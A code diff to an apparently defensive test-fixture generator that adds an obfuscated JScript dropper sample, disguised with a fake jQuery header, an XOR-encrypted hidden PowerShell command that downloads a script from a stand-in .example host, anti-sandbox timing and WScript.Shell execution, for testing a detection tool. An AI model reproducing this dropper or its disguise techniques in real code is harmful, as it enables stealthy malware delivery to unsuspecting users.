@@ -1008,6 +1008,47 @@ def ioc_noise_bat() -> bytes:
     return "\r\n".join(lines).encode("utf-8")
 
 
+def obf_techniques_js() -> bytes:
+    """JScript dropper that stacks the obfuscation techniques DocuTraceX names
+    (javascript_mejoras.md): fake jQuery header, arithmetic literals, a massive
+    \\xNN block, a custom XOR decryptor with a hard-coded key over a numeric
+    payload array, fromCharCode with arithmetic, an IIFE fed a long string, and
+    anti-sandbox timing (WScript.Sleep + a Date delta). The decrypted payload is
+    an inert PowerShell line pointing at *.example. Benign: never runs anything
+    real outside a sandbox stub."""
+    payload = ('powershell -nop -w hidden -c "Write-Host invoice-check; '
+               'iwr http://billing-portal.example/inv/stage3.ps1 -OutFile $env:TEMP\\inv.ps1"')
+    key = "Fact2024"
+    arr = ",".join(str(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(payload))
+    esc = "".join(f"\\x{ord(c):02x}" for c in "MSXML2.XMLHTTP|WScript.Shell|Scripting.FileSystemObject|ADODB.Stream")
+    blob = "aW52b2ljZS0yMDI0LTA2MTMgcGF5bWVudCByZWNlaXB0IC0gYmlsbGluZy1wb3J0YWwuZXhhbXBsZQ==" * 2
+    js = f"""/*!
+ * jQuery JavaScript Library v3.7.1
+ * https://jquery.com/
+ * Copyright OpenJS Foundation and other contributors
+ * Released under the MIT license
+ */
+var _0xa = "{esc}";
+var cfg = [(40+20),(9*3),(100-1),(7*7),(50+50),(3*11),(64-16),(2*21),(90+9),(12*5)];
+var k = "{key}";
+var data = [{arr}];
+function dec(a, key) {{
+  var o = "";
+  for (var i = 0; i < a.length; i++) {{ o += String.fromCharCode(a[i] ^ key.charCodeAt(i % key.length)); }}
+  return o;
+}}
+var t0 = new Date().getTime();
+WScript.Sleep((5*3)*1000);
+var t1 = new Date().getTime();
+if (t1 - t0 < (10*1000)) {{ /* time skipped: probably a sandbox */ }}
+var shellName = String.fromCharCode((80+7), (80+3), (90+9), (100+14), (100+5), (100+12), (110+6)) + ".Shell";
+(function(s) {{ var note = s.length; }})("{blob}");
+var sh = new ActiveXObject(shellName);
+sh.Run(dec(data, k), 0, false);
+"""
+    return js.encode("utf-8")
+
+
 def build_all() -> dict[str, bytes]:
     out: dict[str, bytes] = {
         "sample.docx": word_docx(), "sample.docm": word_docm(),
@@ -1015,6 +1056,7 @@ def build_all() -> dict[str, bytes]:
         "sample.rtf": rtf_doc(), "sample.pdf": pdf_doc(),
         "sample.eml": eml_doc(), "sample.emlx": emlx_doc(), "sample.msg": msg_doc(),
         "sample_dropper.js": obf_js(), "sample_obfuscatorio.js": obf_obfuscatorio_js(),
+        "sample_obf_techniques.js": obf_techniques_js(),
         "sample_stage2.ps1": stage2_ps1(), "sample_dropper.vbs": dropper_vbs(),
         "sample_dropper.bat": dropper_bat(), "sample_ioc_noise.bat": ioc_noise_bat(), "sample_loader.hta": loader_hta(),
         "sample_shortcut.pdf.lnk": shortcut_lnk(), "sample_shortcut.url": internet_shortcut_url(),
